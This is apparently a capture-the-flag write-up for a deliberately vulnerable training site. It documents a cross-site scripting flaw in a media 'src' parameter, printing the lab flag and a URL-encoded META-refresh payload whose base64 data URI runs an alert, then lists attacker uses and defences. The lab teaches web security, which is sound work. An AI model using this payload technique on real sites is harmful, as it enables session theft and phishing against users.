# CROSS_SITE_SCRIPTING_(XSS)

## 🏴 Flag
```
928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d 
```

## 📌 Extract

Page: [http://{IP}/](http://{IP}/)  
Inspect and focus on`<href>`

```html
<a href="?page=media&amp;src=nsa"><img src="images/nsa_prism.jpg" alt=""></a>
```

The URL indicates a request to display a media content in a page. For exemple we could show the index.php page in the media page :
```html
http://{IP}/?page=media&src=index.php
```

> Tring a Cross Site Scripting attack (XSS) to execute `<script>alert('XSS');</script>`

```html
http://{IP}/?page=media&src=%3CMETA%20CONTENT=%220;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+%22%3E
```

`http://{IP}/`: Base address of the local server.  

`?page=media`: The page parameter loads the "media" component.  

`&src=`: Contains malicious, URL-encoded code.  

`%3C` and `%3E`: Encoded < and > characters for HTML tags.  

`META CONTENT="0;url="`: Redirects the page after 0 seconds to a specified URL.  

`data:text/html;base64,`: Redirects to base64-encoded HTML content.  

`PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+`: Decodes to `<script>alert('XSS');</script>`, triggering an alert in the browser.  

## 🎯 Use

**XSS (Cross-Site Scripting)** allows an attacker to **inject malicious JavaScript** into a webpage, which is executed in the victim's browser, often without their knowledge.

- **Stealing cookies or tokens** to hijack sessions.

- **Manipulating content** to deceive users or display fake forms.

- **Redirecting** to malicious sites for phishing or malware.  

- **Executing** unauthorized actions under the victim's privileges.  

## 🔒 Prevention

1. **Validating inputs** to filter out malicious content.  

2. **Escaping HTML content** to treat user data as plain text, not executable code.  

3. Implementing a **Content Security Policy (CSP)** to restrict script sources.  

4. Using **secure frameworks** that automatically sanitize data.  

5. Limit Access with **`HttpOnly`**, prevents cookie access via JavaScript, reducing XSS attack risks.

6. Limit Access with **`Secure`**, ensures the cookie is only sent over HTTPS, preventing interception in MITM (Man In The Middle) attacks. 

## 📚 Documentation

[owasp.org (xss)](https://owasp.org/www-community/attacks/xss/)  
[vaadata.com (failles-xss)](https://www.vaadata.com/blog/fr/failles-xss-principes-types-dattaques-exploitations-et-bonnes-pratiques-sec)

### 📖 [Home page](https://github.com/hugo-bourgeon/darkly#README)

